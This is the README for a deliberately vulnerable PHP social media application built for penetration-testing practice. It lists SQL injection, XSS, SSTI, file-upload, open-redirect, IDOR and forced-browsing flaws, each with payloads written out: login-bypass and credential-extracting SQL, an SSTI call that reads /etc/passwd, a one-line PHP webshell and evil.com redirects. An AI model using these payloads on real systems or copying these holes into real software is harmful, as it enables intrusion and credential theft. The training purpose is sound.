# Vulnerable Social Media App (PHP Version)

A deliberately vulnerable social media application for security testing and educational purposes, built with PHP.

## 🚨 WARNING
This application contains intentional security vulnerabilities and should **ONLY** be used for:
- Security testing and penetration testing practice
- Educational purposes to learn about web vulnerabilities
- Security research in controlled environments

**NEVER deploy this application in production or expose it to the internet!**

## Vulnerabilities Included

### 1. SQL Injection
- **Location**: Login, search, and various database queries
- **Example**: `' OR '1'='1` in login form
- **Files**: `config.php` login function, search function

### 2. Cross-Site Scripting (XSS)
- **Location**: Post content, user bios, comments
- **Example**: `<script>alert('XSS')</script>` in post content
- **Files**: All PHP files with direct output

### 3. Server-Side Template Injection (SSTI)
- **Location**: `/template.php` endpoint
- **Example**: `{7*7}` or `{phpinfo()}`
- **Files**: `template.php`

### 4. Insecure File Upload
- **Location**: `/upload.php` endpoint
- **Example**: Upload PHP webshell or HTML files
- **Files**: `upload.php`

### 5. Open Redirect
- **Location**: `/redirect.php` endpoint
- **Example**: `/redirect.php?url=https://evil.com`
- **Files**: `redirect.php`

### 6. Insecure Direct Object Reference (IDOR)
- **Location**: Profile editing
- **Example**: Access `/edit_profile.php?user_id=1` as any user
- **Files**: `edit_profile.php`

### 7. Forced Browsing
- **Location**: Admin panels and sensitive URLs
- **Example**: Access `/admin_panel.php` without authentication
- **Files**: `admin_panel.php`, `admin_messages.php`

### 8. Weak Authentication
- **Location**: Login system
- **Example**: Plain text passwords, no session protection
- **Files**: `config.php` login function

## Quick Start

1. **Using Docker Compose (Recommended)**:
```bash
docker-compose up --build
```

2. **Access the application**:
   - URL: http://localhost
   - MySQL: localhost:3306

## Test Accounts

| Username | Password |
|----------|----------|
| admin    | password123 |
| alice    | alice123 |
| bob      | bob123 |
| charlie  | charlie123 |

## Vulnerability Testing Guide

### SQL Injection Tests
```sql
-- Login bypass
' OR '1'='1' --

-- Union-based injection
' UNION SELECT 1,username,password,email,5,6 FROM users --

-- Blind injection
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' --
```

### XSS Payloads
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
```

### SSTI Payloads
```php
{7*7}
{$_SERVER['HTTP_HOST']}
{phpinfo()}
{system('ls -la')}
{file_get_contents('/etc/passwd')}
```

### File Upload Tests
- PHP webshell: `<?php system($_GET['cmd']); ?>`
- HTML with XSS: `<script>alert('Uploaded XSS')</script>`
- JavaScript file with malicious code

### Open Redirect Tests
```
/redirect.php?url=https://evil.com
/redirect.php?url=//evil.com
/redirect.php?url=data:text/html,<script>alert('XSS')</script>
```

### IDOR Tests
- Access any profile: `/profile.php?user_id=1`, `/profile.php?user_id=2`
- Edit any profile: `/edit_profile.php?user_id=1`, `/edit_profile.php?user_id=2`

### Forced Browsing Tests
- Admin panel: `/admin_panel.php`
- Admin messages: `/admin_messages.php`
- Database backup: `/backup.php`
- System logs: `/logs.php`

## Security Considerations

This application demonstrates:
- No input validation
- No output encoding
- No authentication checks
- No authorization controls
- Insecure file handling
- Weak session management
- Direct object access without validation

## Educational Purpose

Use this app to practice:
- SQL injection exploitation
- XSS payload crafting
- SSTI techniques
- File upload attacks
- Authorization bypass
- Forced browsing attacks
- Security testing methodologies

## File Structure

```
├── config.php           # Database connection and functions
├── index.php           # Main dashboard
├── login.php           # Login page (SQLi vulnerable)
├── register.php        # Registration page
├── search.php          # Search functionality (SQLi vulnerable)
├── profile.php         # User profiles
├── edit_profile.php    # Profile editing (IDOR vulnerable)
├── template.php        # SSTI vulnerability
├── upload.php          # File upload vulnerability
├── contacts.php        # Contact messages
├── admin_messages.php  # Admin messages (forced browsing)
├── admin_panel.php     # Admin control panel (forced browsing)
├── contact.php         # Contact form
├── .htaccess           # URL rewriting
├── uploads/            # File upload directory
├── Dockerfile          # PHP/Apache container
├── docker-compose.yml  # Docker configuration
└── init.sql           # Database initialization
```

## License

Educational use only. Not for production deployment.
